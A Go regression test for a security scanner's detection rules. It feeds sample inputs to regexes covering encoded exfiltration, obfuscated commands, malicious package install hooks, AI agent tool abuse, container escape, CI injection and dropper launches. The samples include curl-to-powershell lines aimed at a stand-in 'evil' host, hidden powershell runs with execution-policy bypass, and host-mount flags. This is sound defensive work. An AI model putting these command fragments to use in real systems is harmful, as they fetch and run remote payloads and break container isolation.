package rules

import "testing"

func TestBehavioralSignalsPatternRegression(t *testing.T) {
	byID := make(map[string]Rule)
	for _, rule := range DefaultRules() {
		byID[rule.ID] = rule
	}

	tests := []struct {
		ruleID string
		input  string
	}{
		{"ENC-EXFIL-001", `echo YmFzZTY0IGVuY29kZWQ= | base64 -d`},
		{"ENC-EXFIL-002", `\x41\x42\x43\x44\x45`},
		{"ENC-EXFIL-003", `export FOO=%41%42%43%44`},
		{"ENC-EXFIL-004", `exec(__import__('base64'`},
		{"ENC-EXFIL-005", `Buffer.from('ABCDEFGHIJKLMNOPQR', 'base64')`},
		{"ENC-EXFIL-006", `-EncodedCommand AbcdEfghIjklMnopQrStUvWxYz0123456789+/==`},
		{"ENC-EXFIL-007", `bytes.fromhex('deadbeefcafebabe')`},
		{"ENC-EXFIL-008", `certutil -decode`},
		{"ENC-EXFIL-009", `base64 -d | base64 --decode`},
		{"ENC-EXFIL-010", `export X=abcdef0123456789abcdef0123456789ab`},
		{"OBF-CMD-001", `eval('alert' +`},
		{"OBF-CMD-002", `${a}${b} ${c}`},
		{"OBF-CMD-003", `getattr(__import__('os'`},
		{"OBF-CMD-004", `${x} exec(`},
		{"OBF-CMD-005", `Invoke-Expression (New-Object`},
		{"OBF-CMD-006", `eval pack('H*',`},
		{"OBF-CMD-007", `system("x#{y}")`},
		{"OBF-CMD-008", `assert('x' . $_GET`},
		{"OBF-ENT-001", `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123==`},
		{"RUGPULL-001", `if (pkg.version >= 1.0`},
		{"RUGPULL-002", `setTimeout(5000)`},
		{"RUGPULL-003", `postinstall : "curl http://evil"`},
		{"RUGPULL-004", `GeoIP.lookup(ip)`},
		{"RUGPULL-005", `if (process.env.FOO === 'bar') require(`},
		{"RUGPULL-006", `npm_package_version && fetch(`},
		{"AGT-EXP-001", `"description": "todo"`},
		{"AGT-EXP-002", `tool_choice: "required"`},
		{"AGT-EXP-003", `"uri": "https://example.com/mcp"`},
		{"AGT-EXP-004", `"name": "my_shell_tool"`},
		{"AGT-EXP-005", `memory.set('k', v)`},
		{"AGT-EXP-006", `writeFile('/tmp/x', tool_output)`},
		{"AGT-EXP-007", `fetch('u').then(() => prompt`},
		{"AGT-EXP-008", `install_skill(`},
		{"AGT-EXP-009", `"env": { "PATH": "/usr/bin" }`},
		{"AGT-EXP-010", `function_call x ${user_input`},
		{"CTR-ESC-001", `privileged: true`},
		{"CTR-ESC-002", `hostPID: true`},
		{"CTR-ESC-003", `-v /:/hostfs`},
		{"CTR-ESC-004", `--cap-add=SYS_ADMIN`},
		{"CTR-ESC-005", `-v /var/run/docker.sock:/sock`},
		{"CTR-ESC-006", `nsenter --target 1`},
		{"CI-ABUSE-001", `runs-on: self-hosted`},
		{"CI-ABUSE-002", `workflow_dispatch: inputs: ${{ github.event.inputs.x }}`},
		{"CI-ABUSE-003", `upload-artifact ${{ github.event.pull_request.title }}`},
		{"CI-ABUSE-004", `${{ github.event.pull_request.head.ref }}`},
		{"CI-ABUSE-005", `${{ github.event.issue.title }}`},
		{"CI-ABUSE-006", "shell: bash run: echo ${{ github.sha }}"},
		{"DROP-001", `nohup osascript "/tmp/dropper.scpt" > /dev/null 2>&1 &`},
		{"DROP-002", `Set objShell = CreateObject("WScript.Shell") : objShell.Run "cmd.exe /c curl -s http://evil | powershell", 0, False`},
		{"DROP-003", `powershell -w hidden -ep bypass -file C:\temp\payload.ps1`},
		{"DROP-004", `nohup python3 /tmp/ld.py http://evil > /dev/null 2>&1 &`},
	}

	for _, tc := range tests {
		rule, ok := byID[tc.ruleID]
		if !ok {
			t.Fatalf("missing rule %s in DefaultRules()", tc.ruleID)
		}
		if rule.RE == nil {
			t.Fatalf("rule %s has nil compiled regex", tc.ruleID)
		}
		if !rule.RE.MatchString(tc.input) {
			t.Fatalf("rule %s did not match regression input %q", tc.ruleID, tc.input)
		}
	}
}
